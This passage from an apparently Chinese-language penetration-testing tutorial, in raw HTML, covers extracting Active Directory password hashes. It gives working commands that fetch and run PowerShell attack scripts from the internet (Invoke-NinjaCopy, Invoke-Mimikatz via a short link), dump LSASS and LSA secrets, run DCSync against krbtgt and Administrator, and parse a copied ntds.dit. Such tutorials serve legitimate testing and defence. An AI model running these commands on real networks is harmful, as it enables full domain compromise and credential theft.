-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">Invoke-NinaCopy是一个PowerShell函数，它可以利用PowerShell远程处理（必须在目标DC上启用PowerShell远程处理），从远程计算机上复制文件（即使文件已锁定，可直接访问文件）。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://github.com/PowerShellMafia/PowerSploit</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs javascript" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">IEX (New-<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">Object</span> Net.WebClient).DownloadString(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1'</span>); Invoke-NinjaCopy -Path <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"C:windowsntdsntds.dit"</span> -ComputerName <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"AD"</span> -LocalDestination <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"C:tempntds.dit"</span></span></code></pre><h3 name="h3-14" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用Mimikatz提取</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用Mimikatz在提取Active Directory哈希</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cpp" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">mimikatz lsadump::lsa /inject <span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">exit</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用RID 502的帐户是KRBTGT帐户，使用RID 500的帐户是域的默认管理员。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.757396449704142" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/29_sm88BEuqAmpHKnVl1ty5ibJzHeMiaA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVHPib9icA5xtyLoBv3KYKGt4Rn1eqsm88BEuqAmpHKnVl1ty5ibJzHeMiaA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1014" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  />获取对Active Directory数据库文件的访问权限（ntds.dit）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Active Directory数据库（ntds.dit）包含有关Active Directory域中所有对对象的所有信息</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">该文件还包含所有域用户和计算机帐户的密码哈希值。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">有时候域控升级等会把NTDS.DIT备份文件可从共享服务器中找到可以不用直接从域控制复制</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用Mimikatz转储LSASS内存</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs css" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">sekurlsa</span>::minidump <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">c</span>:templsass.dmp</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用任务管理器（获取域管理员凭据）转储LSASS内存</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.5439519158527423" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/30_nUDic99YxM6xQibxzFPtQWxew6X8kw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVKiaZvMXuFrgJ0nRiaB4FKeswhbBanUDic99YxM6xQibxzFPtQWxew6X8kw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1331" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><h3 name="h3-15" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用PowerShell Mimikatz</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用PowerShell的</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">域必需要能上网否则这方法不可用</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">powershell <span class="hljs-title" style="font-size:14px;line-height:34px;;color: rgb(153, 0, 0);font-weight: bold;">IEX</span> (New-Object Net.WebClient).<span class="hljs-title" style="font-size:14px;line-height:34px;;color: rgb(153, 0, 0);font-weight: bold;">DownloadString</span>(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'http://is.gd/oeoFuI'</span>); Invoke-Mimikatz -Command <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'"privilege::debug" "LSADump::LSA /inject" exit'</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">无程获取</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs php" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Powershell IEX (<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">New</span>-Object Net.WebClient).DownloadString(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'http://is.gd/oeoFuI'</span>); Invoke-Mimikatz -Command ‘”privilege::debug” “LSADump:LSA /inject”‘ -Computer pentest.com</span></code></pre><h3 name="h3-16" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Mimikatz的DCSync</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用Mimikatz的DCSync远程转储Active Directory凭证</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">它有效地”模拟”域控制器并向目标域控制器请求帐户密码数据。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用Mimikatz的DCSync和相应的权限，攻击者可以通过网络从域控制器中提取密码散列以及以前的密码散列，而无需交互式登录或复制Active Directory数据库文件（ntds.dit）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">运行DCSync需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都能够运行DCSync来提取密码数据。请注意，只读域控制器不仅可以默认为用户提取密码数据。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.6794258373205742" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/31_cXufN0lUtNQibGkTjmZOxzCYO6lbAQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVyPMTD1iaInu1mdX3tumyiaJic1X8cXufN0lUtNQibGkTjmZOxzCYO6lbAQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1254" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">提取KRBTGT用户帐户的密码数据：</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs bash" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Mimikatz <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"privilege::debug"</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt"</span><span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">exit</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">管理员用户帐户提取密码数据：</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs bash" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Mimikatz <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"privilege::debug"</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator"</span> <span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">exit</span></span></code></pre><h3 name="h3-17" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">NTDS.DIT中提取哈希</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">从NTDS.DIT中提取哈希</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">提取出来的文件通过ntdsdump是无法提取的通过esedbexport来恢复。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">安装：</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs ruby" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">wget <span class="hljs-symbol" style="font-size:14px;line-height:34px;;color: rgb(153, 0, 115);">https:</span>/<span class="hljs-regexp" style="font-size:14px;line-height:34px;;color: rgb(0, 153, 38);">/github.com/libyal/libesedb/releases/download/</span><span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">20170121</span>/libesedb-experimental-<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">20170121</span>.tar.gz<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">`
apt-get install autoconf automake autopoint libtool pkg-config
./configure
make
make install
ldconfig</span></span></code></pre><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs css" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">esedbexport</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">-m</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">tables</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">ntds</span>.dit</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">大概需要（20-30分钟）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">最后生成在./ntds.dit.export/</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用ntdsxtract提取域信息</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">git</span> clone https://github.com/csababarta/ntdsxtract.git
